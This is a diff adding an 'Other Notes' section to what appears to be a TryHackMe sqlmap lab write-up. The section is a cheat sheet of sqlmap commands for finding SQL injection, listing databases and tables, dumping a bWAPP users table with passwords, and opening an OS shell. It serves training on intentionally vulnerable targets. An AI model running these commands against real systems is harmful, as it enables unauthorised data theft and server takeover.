@@ -613,3 +613,55 @@ sqlmap -r blood.txt -p blood_group --dump
 thm{sqlm@p\_is\_L0ve}
 
 </details>
+
+## Other Notes
+
+#### Check if injection exists
+
+```bash
+sqlmap -r <REQUEST_FILE> -p <POST_PARAMETER>
+sqlmap -r Post.req
+
+sqlmap -u "http://<TARGET_IP>/sqli_1.php?title=hacking&action=search" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title
+
+sqlmap -u "http://10.10.10.10/file.php?id=1" -p id          #GET Method
+sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin"      #POST Method
+```
+
+#### **Get database if injection Exists**
+
+```bash
+sqlmap -r login.req --dbs
+sqlmap -u "http://10.10.10.10/file.php?id=1" --dbs    #determine the databases:
+sqlmap -u "http://10.10.10.10/file.php?id=1" -p id --dbs    #GET Method
+sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" --dbs #POST Method
+
+# List databases
+sqlmap -u "http://<TARGET_IP>/sqli_1.php?title=hacking&action=search" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title --dbs
+sqlmap -u "http://<TARGET_IP>/sqli_1.php?title=hacking&action=search" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title -D bWAPP --tables
+sqlmap -u "http://<TARGET_IP>/sqli_1.php?title=hacking&action=search" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title -D bWAPP -T users --columns
+sqlmap -u "http://<TARGET_IP>/sqli_1.php?title=hacking&action=search" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title -D bWAPP -T users -C admin,password,email --dump
+```
+
+**Get Tables in a Database**
+
+```bash
+sqlmap -r login.req -D dbname --tables    #determine the tables:
+sqlmap -u "http://10.10.10.10/file.php?id=1" -D dbname --common-tables    #if tables not available, guess tables using common names
+sqlmap -u "http://10.10.10.10/file.php?id=1" -p id -D dbname --tables        #GET Method
+sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" -D dbname --tables #POST Method
+```
+
+**Get data in a Database tables**
+
+```bash
+sqlmap -r login.req -D dbname -T table_name --dump
+sqlmap -u "http://10.10.10.10/file.php?id=1" -p id -D dbname -T table_name --dump      #GET Method
+sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" -D dbname -T table_name --dump   #POST Method
+```
+
+#### Get OS-Shell
+
+```bash
+sqlmap -u "http://10.10.10.10/file.php?id=1" --os-shell
+```
